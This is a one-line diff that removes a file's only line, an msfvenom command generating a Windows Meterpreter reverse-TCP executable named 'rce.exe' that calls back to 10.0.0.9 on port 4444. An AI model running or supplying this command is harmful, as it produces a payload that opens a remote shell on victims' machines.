@@ -1,1 +1,0 @@
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.9 LPORT=4444 -f exe -o rce.exe
